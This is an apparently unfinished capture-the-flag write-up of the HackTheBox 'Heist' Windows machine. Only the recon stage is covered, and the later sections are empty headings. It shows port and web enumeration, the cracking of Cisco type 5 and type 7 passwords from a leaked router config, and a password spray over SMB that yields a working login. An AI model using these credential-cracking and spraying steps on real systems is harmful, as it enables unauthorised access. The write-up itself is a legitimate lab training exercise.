---
title: "HackTheBox - Easy - Heist"
date: 2025-11-08 12:00:00 -0000
categories: [CTF, HackTheBox]
tags: [windows]
---

![Heist](/assets/img/ctf/htb/easy/heist/heist.png)

# Initial Intel
* Difficulty: Easy
* OS: Windows

# tl;dr
<details><summary>Spoilers</summary>
</details>

# Attack Path

## Recon

### Service Enumeration

Standard TCP scan to start:

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ nmap_tcp_full $heist  
...
PORT      STATE SERVICE       REASON          VERSION  
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0 
    | http-title: Support Login Page 
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds? syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC 
```

Notable services:

#### 80/tcp - HTTB

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]  
└─$ whatweb $heist
...
http://10.10.10.149 [302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.149], Microsoft-IIS[10.0], PHP[7.3.1], RedirectLocation[login.php], X-Powered-By[PHP/7.3.1]      http://10.10.10.149/login.php [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.149], JQuery[3.1.1], Microsoft-IIS[10.0], PHP[7.3.1], PasswordField[login_password], Script, Title[Support Login Page], X-Powered-By[PHP/7.3.1]
```

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist] 
└─$ feroxbuster --url http://$heist --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
```

http://10.10.10.149/login.php

![Webserver Login Page](/assets/img/ctf/htb/easy/heist/1.png)

Login Page, can login as 'guest'.

http://10.10.10.149/issues.php

![Guest login - Issues](/assets/img/ctf/htb/easy/heist/2.png)

Logged in as *guest*, issues with attachments upload feature.

http://10.10.10.149/attachments/config.txt

![Attachments - config.txt](/assets/img/ctf/htb/easy/heist/3.png)

*hazard* username. Also, context for *config.txt*:

```text
Hi, I've been experiencing problems with my cisco router. Here's a part of the configuration the previous admin had been using. I'm new to this and don't know how to fix it. :(
```
![config.txt - users and passwords](/assets/img/ctf/htb/easy/heist/4.png)

Some additional usernames and potential passwords were also in the file.

```text
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```

Type 5 Password Decrypt:
[Type 5 Password Decrypt](https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html)

```bash

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ vim hashes.ciscoASAMD5
$1$pdQG$o8nrSzsGXeaduXrjlvKc91

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.ciscoASAMD5 
...
$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
```

Type 7 Password Decrypt
[Type 7 Password Decrypt](https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html)

```text
0242114B0E143F015F5D1E161713:$uperP@ssword
02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
```

```text
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ cat users.txt
hazard
rout3r
admin
```


```text
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ cat passwords.txt 
stealth1agent
Q4)sJu\Y8qz*A3?d
$uperP@ssword 
```

#### 445/tcp - SMB
```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist] 
└─$ enum4linux-ng -A $heist
...
SMB Dialect Check on 10.10.10.149   
    SMB 1.0: false  
    SMB 2.02: true
    SMB 2.1: true 
    SMB 3.0: true
    SMB 3.1.1: true

Domain Information via SMB session for 10.10.10.149
    NetBIOS computer name: SUPPORTDESK
    DNS domain: SupportDesk
    FQDN: SupportDesk
    Derived membership: workgroup member 
```

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
└─$ nxc smb $heist -u users.txt -p passwords.txt --continue-on-success
...
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent   
```

```text
hazard:stealth1agent
```



## Foothold

## Lateral Movement / Privilege Escalation

## Root / SYSTEM

# Lessons Learned

